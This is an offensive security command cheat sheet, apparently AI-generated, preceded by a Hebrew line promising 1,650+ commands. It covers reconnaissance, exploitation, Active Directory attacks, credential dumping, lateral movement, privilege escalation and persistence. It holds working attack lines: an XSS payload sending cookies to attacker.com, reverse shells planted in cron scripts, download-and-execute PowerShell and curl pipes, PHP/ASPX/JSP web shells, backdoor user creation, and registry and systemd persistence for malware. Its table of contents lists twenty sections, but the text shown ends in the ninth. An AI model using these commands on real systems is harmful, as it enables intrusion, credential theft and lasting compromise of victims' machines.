אתה צודק! אשלים את כל הפקודות עם הסברים מפורטים. אכתוב את כל 1,650+ הפקודות עם הסברים קצרים על אופן השימוש.

# Ultimate Offensive Security Command Reference

## Table of Contents
1. [Reconnaissance & OSINT](#1-reconnaissance--osint)
2. [Vulnerability Scanning](#2-vulnerability-scanning)
3. [Web Application Attacks](#3-web-application-attacks)
4. [Network Exploitation](#4-network-exploitation)
5. [Active Directory Attacks](#5-active-directory-attacks)
6. [Post-Exploitation](#6-post-exploitation)
7. [Lateral Movement](#7-lateral-movement)
8. [Privilege Escalation](#8-privilege-escalation)
9. [Persistence Mechanisms](#9-persistence-mechanisms)
10. [Command & Control](#10-command--control)
11. [Cloud Security](#11-cloud-security)
12. [Container Security](#12-container-security)
13. [Mobile & Wireless](#13-mobile--wireless)
14. [API Security](#14-api-security)
15. [DevSecOps Tools](#15-devsecops-tools)
16. [ICS/SCADA Security](#16-icsscada-security)
17. [Zero Trust & Modern Security](#17-zero-trust--modern-security)
18. [AI/ML Security](#18-aiml-security)
19. [Anti-Forensics](#19-anti-forensics)
20. [Password Attacks](#20-password-attacks)

---

## 1. Reconnaissance & OSINT

### Subdomain Enumeration
```bash
# Amass - Comprehensive subdomain discovery
amass enum -passive -d target.com -o amass_passive.txt
# Use: Initial reconnaissance without alerting target - uses OSINT sources only

amass enum -active -d target.com -brute -w wordlist.txt
# Use: Comprehensive discovery - actively queries DNS and brute forces

amass track -d target.com -last 3 -dir project/
# Use: Continuous monitoring - tracks changes in attack surface

amass viz -d3 -dir project/ -o network.html
# Use: Visualization - creates interactive network graph

# Subfinder - Fast subdomain discovery
subfinder -d target.com -all -recursive -t 100
# Use: Quick enumeration - uses 50+ sources with threading

subfinder -dL domains.txt -o all_subs.txt -t 50
# Use: Bulk processing - scans multiple domains from file

# AssetFinder & Findomain
assetfinder --subs-only target.com
# Use: Simple discovery - quick subdomain enumeration

assetfinder target.com | httprobe
# Use: Live service checking - finds active web services

findomain -t target.com -u output.txt
# Use: Fast discovery - uses certificates transparency

findomain -f domains.txt --threads 50
# Use: Bulk scanning - processes multiple domains

# Chaos dataset
chaos -d target.com -o chaos_subs.txt
# Use: Project Discovery dataset - uses curated subdomain lists
```

### DNS Reconnaissance
```bash
# DNSRecon - Comprehensive DNS analysis
dnsrecon -d target.com -t axfr,brt,crt,std
# Use: Full DNS enumeration - zone transfer, brute force, certificates

dnsrecon -d target.com -t axfr
# Use: Zone transfer check - attempts DNS zone transfer

dnsrecon -r 10.10.10.0/24 -n 8.8.8.8 -t rvl
# Use: Reverse lookup - finds domains in IP range

# MassDNS - High-performance resolution
./massdns -r resolvers.txt -t A -o S -w output.txt subdomains.txt
# Use: Mass resolution - validates thousands of subdomains quickly

# Manual DNS tools
dig target.com ANY
# Use: All record types - gets all DNS records

dig target.com AXFR @ns1.target.com
# Use: Manual zone transfer - direct request to name server

dig target.com TXT
# Use: Text records - finds SPF, DKIM, other text records

for sub in $(cat subs.txt); do dig $sub.target.com +short; done
# Use: Bulk resolution - resolves multiple subdomains

dnsenum target.com --threads 50
# Use: Comprehensive enumeration - multiple enumeration techniques

fierce --domain target.com --wordlist dns.txt
# Use: Domain scanner - finds subdomains and IPs
```

### Port Scanning & Service Detection
```bash
# Nmap - Comprehensive network scanning
nmap -sS -sU -A -T4 -p- target.com
# Use: Full scan - SYN, UDP, OS detection, version detection

nmap -sS -T2 -f -D RND:10 target.com
# Use: Stealth scan - fragmentation and decoys

nmap -sV -sC -p 80,443,22 target.com
# Use: Service detection - version and default scripts

nmap --script vuln,exploit target.com
# Use: Vulnerability scanning - checks for known vulnerabilities

nmap --script "default or safe" target.com
# Use: Safe scanning - non-intrusive checks

# RustScan - Ultra-fast scanning
rustscan -a 10.10.10.0/24 --ulimit 5000 -- -sV -sC
# Use: Fast discovery - finds ports quickly then detailed scan

rustscan -a target.com -r 1-65535 -t 2000
# Use: Full port scan - all ports with high threading

# Masscan - Internet-scale scanning
masscan -p0-65535 10.10.10.0/24 --rate=100000
# Use: Large networks - extremely fast for big ranges

masscan -p80,443,22 --banners -oJ output.json
# Use: Banner grabbing - gets service banners at scale

# Naabu - Modern port scanner
naabu -host target.com -p - -silent | httpx -silent
# Use: Integration - port scan with HTTP validation

naabu -list hosts.txt -p 80,443,8080
# Use: Bulk scanning - multiple targets for specific ports
```

### Web Reconnaissance
```bash
# HTTPX - Advanced HTTP service detection
cat subdomains.txt | httpx -silent -status-code -title -tech-detect
# Use: Web inventory - finds live services with technology stack

httpx -l hosts.txt -H "X-Forwarded-For: 127.0.0.1" -ports 80,443
# Use: Header testing - sends custom headers to bypass WAF

# Wayback Machine & archives
echo target.com | waybackurls
# Use: Historical URLs - finds old endpoints from Wayback Machine

echo target.com | gau
# Use: Multiple sources - gets URLs from Common Crawl and others

cat urls.txt | grep "?" | qsreplace -a
# Use: Parameter analysis - finds and tests URL parameters

# Katana - Crawling & discovery
katana -u https://target.com -depth 5 -jc -aff
# Use: Comprehensive crawling - JavaScript and form analysis

katana -list urls.txt -c 10 -d 3 -jc
# Use: List-based crawling - multiple entry points

# Gospider - Fast web spider
gospider -s https://target.com -d 2 -t 10 -c 5
# Use: Fast spidering - concurrent requests with depth control
```

### Cloud Reconnaissance
```bash
# CloudMapper - Multi-cloud assessment
python3 cloudmapper.py collect --account-name target
# Use: Cloud data collection - gathers AWS/GCP/Azure configs

python3 cloudmapper.py prepare --account-name target
# Use: Data preparation - processes collected data

python3 cloudmapper.py webserver --public --port 8000
# Use: Visualization - web interface for cloud infrastructure

# S3Scanner - AWS S3 discovery
python3 s3scanner.py --bucket-lists buckets.txt --region us-east-1
# Use: S3 bucket discovery - finds and checks S3 buckets

python3 s3scanner.py --check-acls --bucket-lists buckets.txt
# Use: Permission checking - identifies misconfigured buckets

# Shodan - Internet device search
shodan download target_data "org:Target Corp"
# Use: Organization search - finds internet-exposed assets

shodan parse --fields ip_str,port,org target_data.json.gz
# Use: Data parsing - extracts specific fields from results
```

---

## 2. Vulnerability Scanning

### Automated Scanning
```bash
# Nuclei - High-speed vulnerability detection
nuclei -l targets.txt -t cves/ -t exposures/ -t misconfiguration/
# Use: Template scanning - uses 1000+ templates for various checks

nuclei -u https://target.com -t templates/ -tags xss,sqli
# Use: Targeted scanning - focuses on specific vulnerability types

nuclei -l targets.txt -t workflows/cve-detection.yaml
# Use: Workflow scanning - complex attack chain detection

nuclei -l targets.txt -t cves/ -rate-limit 150 -concurrency 25
# Use: Performance tuning - controlled scanning speed

# Nikto - Web server security
nikto -h https://target.com -C all -Tuning 1,2,3,4,5,6,7,8,9
# Use: Web server scan - comprehensive server misconfigurations

nikto -h target.com -p 80,443 -evasion 1 -mutate 1
# Use: Evasion techniques - IDS evasion and mutation

# Nessus & Nexpose
/opt/nessus/bin/nessus -q -x -T html -o report.html target.com
# Use: Commercial scanning - enterprise vulnerability assessment

curl -X GET "https://nexpose:3780/api/3/assets" -H "Authorization: Basic ..."
# Use: API integration - automated asset and scan management
```

### Web Vulnerability Scanners
```bash
# OWASP ZAP
zap-baseline.py -t https://target.com -r report.html
# Use: Baseline scan - quick security assessment

zap-full-scan.py -t https://target.com -I -j -T 60
# Use: Full scan - comprehensive with authentication

zap-api-scan.py -t https://target.com/api/swagger.json -f openapi
# Use: API scanning - uses OpenAPI specification

# Arachni
arachni https://target.com --checks=* --scope-directory-depth-limit=10
# Use: Deep scanning - extensive checks with configurable depth

arachni https://target.com --checks=sql_injection,xss --http-request-concurrency=10
# Use: Specific checks - focused vulnerability testing

# Burp Suite
java -jar burpsuite_pro.jar --project-file=project.burp --unpause-spider-and-scanner
# Use: Headless scanning - automation in CI/CD pipelines

curl -X POST "http://burp:8080/v0.1/scan" -H "Content-Type: application/json"
# Use: REST API - programmatic scan control
```

### API Security Testing
```bash
# Arjun - Parameter discovery
python3 arjun.py -u https://target.com/api/endpoint
# Use: Hidden parameters - discovers undocumented parameters

python3 arjun.py -i api_endpoints.txt -m GET -o parameters.txt
# Use: Bulk processing - tests multiple endpoints

# Kiterunner - API route brute forcing
kr scan https://target.com -w api-wordlist.txt -x 20
# Use: Route discovery - finds undocumented API endpoints

kr brute https://target.com -w large-wordlist.txt
# Use: Comprehensive discovery - large-scale route testing

# Postman/Newman
newman run collection.json -e environment.json
# Use: API testing - automated collection running

newman run api_tests.json --delay-request 100 --timeout-request 300
# Use: Performance testing - controlled request timing
```

### Network Vulnerability Scanners
```bash
# OpenVAS
gvm-cli socket --socketpath /run/gvmd/gvmd.sock --get-tasks
# Use: Task management - lists scanning tasks

gvm-cli socket --xml "<create_task>...</create_task>"
# Use: XML API - programmatic task creation

# Nmap NSE scripts
nmap -sV --script vuln 10.10.10.0/24
# Use: Network vuln scanning - checks for known vulnerabilities

nmap --script "exploit" 10.10.10.5
# Use: Exploit checking - identifies exploitable services

nmap --script ssh-brute --script-args userdb=users.txt
# Use: Service brute force - credential testing

# Vulners script
nmap -sV --script vulners 10.10.10.5
# Use: CVE detection - matches services against CVE database
```

---

## 3. Web Application Attacks

### SQL Injection
```bash
# SQLMap - Automated SQL injection
sqlmap -u "https://target.com/page?id=1" --batch --level=5 --risk=3
# Use: Automated detection - comprehensive parameter testing

sqlmap -u "https://target.com/login" --data="username=admin&password=test" --method POST
# Use: Form testing - POST parameter injection

sqlmap -r request.txt --tamper=between,charencode
# Use: WAF evasion - uses tamper scripts to bypass protections

sqlmap -u "https://target.com/search" --crawl=2 --forms --dump-all
# Use: Complete compromise - crawls and extracts all data

# Manual SQL injection
# Boolean-based: ' AND 1=1-- 
# Use: Basic detection - simple true/false testing

# Time-based: ' AND SLEEP(5)-- 
# Use: Blind SQLi - time-based detection for blind injection

# Union-based: ' UNION SELECT 1,2,3-- 
# Use: Data extraction - union-based data retrieval

# Error-based: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- 
# Use: Error messages - extracts data through error responses
```

### Cross-Site Scripting (XSS)
```bash
# XSStrike
python3 xsstrike.py -u "https://target.com/search?q=test" --crawl -l 3
# Use: Automated detection - crawls and tests parameters

python3 xsstrike.py -u "https://target.com" --fuzzer --blind
# Use: Blind XSS - tests for stored and blind XSS

# Dalfox
dalfox url https://target.com/search?q=test
# Use: Parameter analysis - automatic parameter testing

dalfox file urls.txt --blind https://collaborator.com
# Use: Bulk testing - multiple URLs with blind XSS detection

# XSS Payloads
# Basic: <script>alert('XSS')</script>
# Use: Quick test - basic XSS verification

# Advanced: "><script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
# Use: Cookie theft - steals cookies through XSS

# Polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
# Use: Evasion - complex payload to bypass filters
```

### File Inclusion & Directory Traversal
```bash
# FFuf - Web fuzzing
ffuf -w common.txt -u https://target.com/FUZZ -mc 200,301,302
# Use: Directory discovery - finds hidden directories

ffuf -w parameters.txt:PARAM -u https://target.com/endpoint?PARAM=FUZZ
# Use: Parameter fuzzing - discovers hidden parameters

ffuf -w lfi.txt:FUZZ -u "https://target.com/page?file=FUZZ" -mr "root:"
# Use: LFI testing - tests for local file inclusion

# LFI Payloads
# Basic: ../../../../etc/passwd
# Use: Standard LFI - basic directory traversal

# PHP wrappers: php://filter/convert.base64-encode/resource=index.php
# Use: Source code - reads PHP files through filters

# RFI: http://attacker.com/shell.txt
# Use: Remote inclusion - includes remote files for code execution
```

### Server-Side Request Forgery (SSRF)
```bash
# SSRF testing
ffuf -w ssrf.txt:FUZZ -u "https://target.com/proxy?url=FUZZ" -mc 200
# Use: SSRF detection - tests various URL formats

# SSRF Payloads
# Internal: http://169.254.169.254/latest/meta-data/
# Use: Cloud metadata - accesses cloud instance metadata

# Localhost: http://localhost:22
# Use: Port scanning - scans internal services

# DNS rebinding: http://127.0.0.1.nip.io
# Use: Bypass filters - DNS rebinding to bypass validations
```

### API Attacks
```bash
# GraphQL testing
curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' https://target.com/graphql
# Use: Introspection - gets GraphQL schema information

python3 inql.py -t https://target.com/graphql
# Use: GraphQL scanner - automated GraphQL testing

# JWT attacks
python3 jwt_tool.py <JWT_TOKEN>
# Use: JWT analysis - analyzes and manipulates JWT tokens

python3 jwt_tool.py <JWT_TOKEN> -T -hc "kid" -hv "../../dev/null"
# Use: Algorithm confusion - exploits JWT algorithm issues

# Rate limit testing
for i in {1..100}; do curl -X GET https://target.com/api/endpoint; done
# Use: DoS testing - checks rate limiting implementation
```

---

## 4. Network Exploitation

### SMB/Network Service Attacks
```bash
# CrackMapExec
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt
# Use: Network spraying - tests credentials across multiple hosts

crackmapexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH
# Use: Pass-the-hash - lateral movement with hashes

crackmapexec smb 10.10.10.5 -u user -p password --shares --sessions
# Use: Share enumeration - lists SMB shares and sessions

crackmapexec mssql 10.10.10.0/24 -u sa -p password --query "SELECT name FROM master..sysdatabases"
# Use: Database access - executes SQL queries on MSSQL

# Impacket
python3 psexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use: Remote execution - SMB-based command execution

python3 wmiexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use: WMI execution - alternative to SMB execution

python3 mssqlclient.py -windows-auth domain/user:password@target_ip
# Use: MSSQL client - database server access

# SMBMap
smbmap -H 10.10.10.5 -u user -p password
# Use: Share listing - enumerates SMB shares and permissions

smbmap -H 10.10.10.5 -u user -p password -R ShareName
# Use: Recursive listing - lists all files in share
```

### SNMP & Network Protocols
```bash
# SNMP enumeration
onesixtyone -c community.txt -i targets.txt
# Use: Community string brute force - finds SNMP communities

snmpwalk -c public -v1 10.10.10.5 1.3.6.1.2.1.1.5.0
# Use: System information - gets system details via SNMP

snmp-check 10.10.10.5 -c public
# Use: Comprehensive SNMP - extensive SNMP information gathering

# Network protocols
tftp 10.10.10.5
get /etc/passwd
# Use: TFTP file transfer - file download via TFTP

showmount -e 10.10.10.5
# Use: NFS enumeration - lists NFS shares

ldapsearch -h 10.10.10.5 -x -b "dc=domain,dc=local"
# Use: LDAP enumeration - queries LDAP directory
```

### Remote Service Exploitation
```bash
# Metasploit
use auxiliary/scanner/ssh/ssh_login
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
# Use: Service brute force - credential testing for various services

# Hydra
hydra -L users.txt -P passwords.txt ssh://10.10.10.10
# Use: Network brute force - fast credential spraying

hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
# Use: Web form brute force - HTTP form credential testing

hydra -C creds.txt -M targets.txt -t 10
# Use: Bulk testing - multiple credentials against multiple targets
```

---

## 5. Active Directory Attacks

### Kerberos Attacks
```bash
# Rubeus
Rubeus.exe kerberoast /user:svc_account /domain:domain.local
# Use: Kerberoasting - gets service tickets for cracking

Rubeus.exe asreproast /format:hashcat
# Use: AS-REP roasting - attacks pre-auth disabled accounts

Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /user:administrator /ptt
# Use: Golden ticket - creates forged TGT for persistence

Rubeus.exe silver /rc4:MACHINE_HASH /domain:domain.local /user:user /service:cifs /target:dc.domain.local /ptt
# Use: Silver ticket - creates service-specific tickets

Rubeus.exe ptt /ticket:base64_ticket
# Use: Pass-the-ticket - injects Kerberos tickets

# Impacket Kerberos
python3 GetUserSPNs.py -request -dc-ip DC_IP domain/user:password
# Use: Kerberoasting from Linux - service ticket requests

python3 ticketer.py -nthash HASH -domain-sid SID -domain domain.local administrator
# Use: Ticket creation - golden/silver tickets from Linux
```

### DCSync & Credential Theft
```bash
# Mimikatz
mimikatz # lsadump::dcsync /domain:domain.local /user:administrator
# Use: DCSync attack - extracts domain credentials

mimikatz # sekurlsa::logonpasswords
# Use: Credential dumping - extracts passwords from memory

mimikatz # lsadump::sam
# Use: SAM database - dumps local user credentials

mimikatz # lsadump::secrets
# Use: LSA secrets - extracts system secrets

# SecretsDump
python3 secretsdump.py -just-dc-ntlm domain/user:password@DC_IP
# Use: DCSync from Linux - extracts NTLM hashes

python3 secretsdump.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use: Remote dumping - credentials from remote system
```

### BloodHound & AD Mapping
```bash
# SharpHound
SharpHound.exe --collectionmethods All --domain domain.local
# Use: AD data collection - comprehensive relationship data

SharpHound.exe -c DCOnly -d domain.local --stealth
# Use: Stealth collection - minimal footprint data gathering

# BloodHound Cypher
MATCH p=shortestPath((m:Computer)-[*1..]->(n:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
# Use: Attack path finding - shortest path to high privileges

MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
# Use: Unconstrained delegation - finds systems with delegation

# PowerView
Get-DomainUser -Properties samaccountname,lastlogon,memberof
# Use: User enumeration - gets user information

Get-DomainComputer -Unconstrained
# Use: Computer enumeration - finds specific computer types

Find-InterestingDomainAcl
# Use: ACL analysis - finds interesting permissions
```

### Group Policy Attacks
```bash
# GPO enumeration
Get-DomainGPO -Properties displayname,whenchanged
# Use: GPO discovery - lists Group Policy Objects

# GPO abuse
New-GPOImmediateTask -TaskName "Update" -Command "cmd.exe" -Arguments "/c malware.exe"
# Use: Task creation - adds scheduled tasks through GPO

# SharpGPOAbuse
SharpGPOAbuse.exe --AddUserTask --TaskName "Update" --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add"
# Use: Automated abuse - adds users through GPO

SharpGPOAbuse.exe --AddStartupScript --ScriptName "startup.bat" --ScriptContent "malware.exe"
# Use: Startup script - adds scripts through GPO
```

---

## 6. Post-Exploitation

### Initial Access & Shells
```bash
# PowerShell execution
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
# Use: Memory execution - runs scripts without disk writing

powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"
# Use: Bypass execution - bypasses execution policies

$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"))
powershell -EncodedCommand $encodedCommand
# Use: Encoded execution - obfuscates command

# Web shells
# PHP: <?php system($_GET['cmd']); ?>
# Use: PHP backdoor - command execution through web

# ASPX: <%@ Page Language="C#" %> <script runat="server"> void Page_Load(object sender, EventArgs e) { System.Diagnostics.Process.Start(Request["cmd"]); } </script>
# Use: ASP.NET shell - command execution in ASP.NET

# JSP: <%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
# Use: JSP shell - command execution in Java
```

### Living Off the Land (LOLBins)
```bash
# Windows LOLBins
certutil -urlcache -split -f http://10.10.10.10/payload.exe
# Use: File download - uses certutil for downloading

bitsadmin /transfer job /download /priority normal http://10.10.10.10/payload.exe
# Use: BITS transfer - background file download

regsvr32 /s /n /u /i:http://10.10.10.10/payload.sct scrobj.dll
# Use: Scriptlet execution - runs scripts through regsvr32

mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd.exe"":close")
# Use: HTA execution - runs commands through mshta

# Linux LOLBins
curl http://10.10.10.10/payload.sh | bash
# Use: Pipe execution - downloads and executes directly

python -c "import urllib2; exec(urllib2.urlopen('http://10.10.10.10/payload.py').read())"
# Use: Python execution - downloads and runs Python code

awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
# Use: AWK networking - creates reverse shell with awk
```

### Credential Dumping
```bash
# LaZagne
python2 laZagne.py all
# Use: Multi-platform - extracts various credential types

python2 laZagne.py browsers
# Use: Browser focus - extracts browser passwords

# Windows Credential Editor
wce.exe -w
# Use: Windows credentials - extracts hashes and passwords

# KeePass extraction
KeeThief.exe
# Use: KeePass attack - extracts KeePass master passwords

# LSASS dumping
procdump.exe -ma lsass.exe lsass.dmp
# Use: Memory dumping - creates LSASS memory dump

rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\lsass.dmp full
# Use: Comsvcs dumping - uses built-in DLL for dumping
```

### Memory Analysis
```bash
# Volatility
volatility -f memory.dump imageinfo
# Use: Image identification - identifies memory image profile

volatility -f memory.dump --profile=Win10x64_18362 pslist
# Use: Process listing - shows running processes

volatility -f memory.dump --profile=Win10x64_18362 netscan
# Use: Network connections - shows network activity

volatility -f memory.dump --profile=Win10x64_18362 mimikatz
# Use: Credential extraction - extracts passwords from memory

volatility -f memory.dump --profile=Win10x64_18362 yarascan --yara-file=rules.yar
# Use: Malware detection - scans for malicious patterns
```

---

## 7. Lateral Movement

### Pass-the-Hash & Token Attacks
```bash
# CrackMapExec PTH
crackmapexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH -x whoami
# Use: Hash-based execution - runs commands using hashes

# Impacket PTH
python3 psexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use: Remote execution - SMB execution with hashes

# RDP with PTH
xfreerdp /v:10.10.10.5 /u:administrator /pth:NTLM_HASH
# Use: GUI access - RDP connection using hash

# Token manipulation
Incognito.exe list_tokens -u
# Use: Token enumeration - lists available tokens

Incognito.exe execute -c "DOMAIN\USER" C:\Windows\System32\cmd.exe
# Use: Token impersonation - runs commands as other user

meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\USER"
# Use: Meterpreter tokens - token manipulation through Meterpreter
```

### WMI & Remote Management
```bash
# Impacket WMI
python3 wmiexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use: WMI execution - command execution through WMI

# PowerShell WMI
Get-WmiObject -Class Win32_Process -ComputerName 10.10.10.5 | Invoke-WmiMethod -Name Create -ArgumentList "cmd.exe /c whoami"
# Use: Remote process creation - creates processes via WMI

# WMIC
wmic /node:10.10.10.5 /user:DOMAIN\user /password:pass process call create "cmd.exe /c whoami"
# Use: Built-in WMI - command execution through WMIC

# WinRM
evil-winrm -i 10.10.10.5 -u administrator -p password
# Use: PowerShell remoting - interactive PowerShell session

Enter-PSSession -ComputerName 10.10.10.5 -Credential $cred
# Use: Native PowerShell - built-in PowerShell remoting
```

### PSExec & Service Attacks
```bash
# Impacket PSExec
python3 psexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use: Service execution - creates service for command execution

# SC command
sc \\10.10.10.5 create Update binpath= "cmd.exe /c whoami"
sc \\10.10.10.5 start Update
# Use: Service creation - creates and starts Windows services

# PowerShell services
New-Service -Name "UpdateService" -BinaryPathName "C:\Windows\System32\malware.exe" -StartupType Automatic
# Use: Service persistence - creates persistent service

# Service modification
sc config VulnerableService binPath= "C:\Windows\System32\malicious.dll"
# Use: Service hijacking - replaces service binary
```

### DCOM & COM Object Attacks
```bash
# DCOM execution
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.5"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")
# Use: MMC20 DCOM - command execution through MMC

$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.5"))
$com.Item().Document.Application.ShellExecute("cmd.exe","/c whoami","C:\Windows\System32",$null,0)
# Use: ShellWindows DCOM - alternative DCOM method

# Impacket DCOM
python3 dcomexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use: DCOM execution - uses DCOM for lateral movement
```

### RDP & GUI Access
```bash
# RDP connections
xfreerdp /v:10.10.10.5 /u:administrator /p:password /drive:/home/user,/share
# Use: RDP with shares - connects with shared drives

xfreerdp /v:10.10.10.5 /u:administrator /p:password /restricted-admin
# Use: Restricted admin - RDP without credential caching

# Session hijacking
tscon 2 /dest:console
# Use: Session takeover - takes over existing RDP sessions

# VNC access
vncviewer 10.10.10.5:5900
# Use: VNC connection - connects to VNC servers
```

---

## 8. Privilege Escalation

### Windows Privilege Escalation
```bash
# WinPEAS
winpeas.exe quiet fast
# Use: Automated enumeration - comprehensive system checks

winpeas.exe services processes applications
# Use: Focused checks - specific system areas

# PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerUp.ps1')
Invoke-AllChecks
# Use: PowerShell enumeration - checks for common misconfigurations

Invoke-ServiceAbuse -Name "VulnerableService" -Command "net user backdoor Password123! /add"
# Use: Service abuse - exploits service permissions

# Kernel exploits
Watson.exe --search
# Use: Exploit suggester - identifies applicable kernel exploits

PrintSpoofer.exe -i -c cmd
# Use: Print spooler - exploits printer spooler service

JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
# Use: COM abuse - service account privilege escalation

# Token privileges
whoami /priv
# Use: Privilege checking - shows current token privileges
```

### Linux Privilege Escalation
```bash
# LinPEAS
./linpeas.sh -a -s
# Use: Comprehensive enumeration - extensive Linux checks

./linpeas.sh -quick
# Use: Quick assessment - fast common checks

# Linux Exploit Suggester
python3 linux-exploit-suggester.py --kernel 3.13.0
# Use: Kernel exploits - suggests applicable kernel exploits

./linux-exploit-suggester.sh --checkall
# Use: Full checking - all possible exploit vectors

# SUID/SGID exploitation
find / -perm -4000 -type f 2>/dev/null
# Use: SUID finding - finds privileged executables

find . -exec /bin/sh \; -quit
# Use: SUID abuse - exploits find command SUID

# Capabilities
getcap -r / 2>/dev/null
# Use: Capability finding - finds files with capabilities

# Sudo exploitation
sudo -l
# Use: Sudo permissions - shows available sudo commands

sudo vi -c '!sh'
# Use: Sudo escape - escapes to shell through sudo
```

### Service Abuse & Misconfigurations
```bash
# Windows services
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -like "* *" -and $_.PathName -notlike '"*"'}
# Use: Unquoted paths - finds services with unquoted paths

accesschk.exe -uwcqv "Authenticated Users" *
# Use: Permission checking - checks service permissions

# Linux services
find /etc/systemd/system /usr/lib/systemd/system -type f -perm -o+w 2>/dev/null
# Use: Writable services - finds writable service files

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f" >> /etc/cron.daily/backup.sh
# Use: Cron exploitation - adds reverse shell to cron scripts
```

### Scheduled Task & Cron Exploitation
```bash
# Windows scheduled tasks
schtasks /query /fo LIST /v
# Use: Task enumeration - lists scheduled tasks

schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\malware.exe" /sc minute /mo 30 /ru SYSTEM
# Use: Task persistence - creates scheduled tasks

# WMI events
Get-WmiObject -Namespace root\Subscription -Class __EventFilter
# Use: Event subscription - checks WMI event subscriptions

# Linux cron jobs
crontab -l
# Use: Cron listing - shows user cron jobs

cat /etc/crontab
# Use: System cron - shows system cron jobs

echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" >> /etc/cron.hourly/cleanup.sh
# Use: Cron backdoor - adds reverse shell to cron

# Tar wildcard injection
mkdir -p /tmp/--checkpoint=1
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f' > /tmp/--checkpoint-action=exec=sh.sh
# Use: Wildcard exploitation - exploits tar wildcard usage
```

---

## 9. Persistence Mechanisms

### Windows Persistence
```bash
# Registry persistence
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\Temp\malware.exe"
# Use: Run key - executes at user logon

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\malware.exe"
# Use: Userinit - executes during user initialization

# Alternative registry locations
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Update /t REG_SZ /d "C:\Windows\Temp\malware.exe"
# Use: RunOnce - executes once at next logon

# COM hijacking
reg add "HKCU\Software\Classes\CLSID\{UNIQUE-GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\malware.dll"
# Use: COM persistence - hijacks COM components

# Scheduled tasks
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\malware.exe" /sc minute /mo 30 /ru SYSTEM
# Use: Scheduled execution - runs malware periodically

schtasks /create /tn "Microsoft\Windows\SystemRestore\Update" /tr "C:\Windows\Temp\malware.exe" /sc hourly /ru SYSTEM
# Use: Hidden tasks - creates tasks in system folders

# WMI event subscription
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="UpdateFilter", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
# Use: WMI persistence - triggers execution on events

# Service persistence
sc create "WindowsUpdate" binPath= "C:\Windows\Temp\malware.exe" start= auto
# Use: Service creation - creates Windows service

sc config "VulnerableService" binPath= "C:\Windows\Temp\malware.exe"
# Use: Service modification - changes existing service
```

### Linux Persistence
```bash
# Cron persistence
echo "*/5 * * * * curl http://10.10.10.10/payload.sh | sh" | crontab -
# Use: User cron - adds to user crontab

echo "*/5 * * * * root /tmp/.backdoor" >> /etc/crontab
# Use: System cron - adds to system crontab

echo "@reboot root /tmp/.backdoor" >> /etc/crontab
# Use: Boot persistence - executes at system boot

# Service persistence
cat > /etc/systemd/system/network-update.service << EOF
[Unit]
Description=Network Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do /tmp/.backdoor; sleep 30; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable network-update.service
# Use: Systemd service - creates persistent system service

# Init.d persistence
cp backdoor.sh /etc/init.d/
chmod +x /etc/init.d/backdoor.sh
update-rc.d backdoor.sh defaults
# Use: Init.d service - traditional init system persistence

